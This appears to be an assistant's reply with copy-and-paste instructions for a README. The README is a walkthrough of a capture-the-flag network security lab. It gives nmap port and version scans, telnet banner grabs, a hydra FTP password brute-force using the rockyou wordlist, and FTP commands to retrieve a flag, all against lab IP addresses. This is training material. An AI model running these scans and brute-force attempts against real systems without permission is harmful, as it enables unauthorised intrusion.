To copy the formatted README.md content right now, do this:

1. Click and drag your mouse over **everything** inside this box below (including the lines that say ```markdown

```
```markdown
# Net Sec Challenge - Questions & Commands

## Questions

1. What is the highest port number being open less than 10,000?  
   ```bash
   sudo nmap -sS 10.49.138.238 -p-10000
   ```

2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?  
   ```bash
   sudo nmap -sS 10.48.175.233 -p10000-
   ```

3. How many TCP ports are open?  
   ```bash
   sudo nmap -sS 10.48.175.233 -p-
   ```

4. What is the flag hidden in the HTTP server header?  
   ```text
   telnet 10.49.138.238 80

   GET / HTTP/1.1
   host: telnet
   ```

5. What is the flag hidden in the SSH server header?  
   ```bash
   telnet 10.49.138.238 22
   ```

6. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?  
   ```bash
   sudo nmap -sV 10.48.175.233 -p-
   ```

7. We learned two usernames using social engineering: eddie and quinn.  
   What is the flag hidden in one of these two account files and accessible via FTP?  
   ```bash
   hydra -L usernames.txt -P ./rockyou.txt ftp://10.49.138.238:10021
   ```

   ```bash
   ftp 10.48.135.177 10021
   ls
   get ftp_flag.txt
   ```

8. Browsing to http://10.48.175.233:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?  
   ```bash
   nmap -sN 10.49.138.238 -v
   ```
```

2. Press **Ctrl + C** (or **Cmd + C** on Mac) to copy it.
3. Open your text editor (Notepad, VS Code, Obsidian, nano, etc.), create a new file called `README.md`
4. Paste the content with **Ctrl + V** (or **Cmd + V**)
5. Save the file

The ```markdown:disable-run

Done! Let me know if it doesn't paste correctly.
```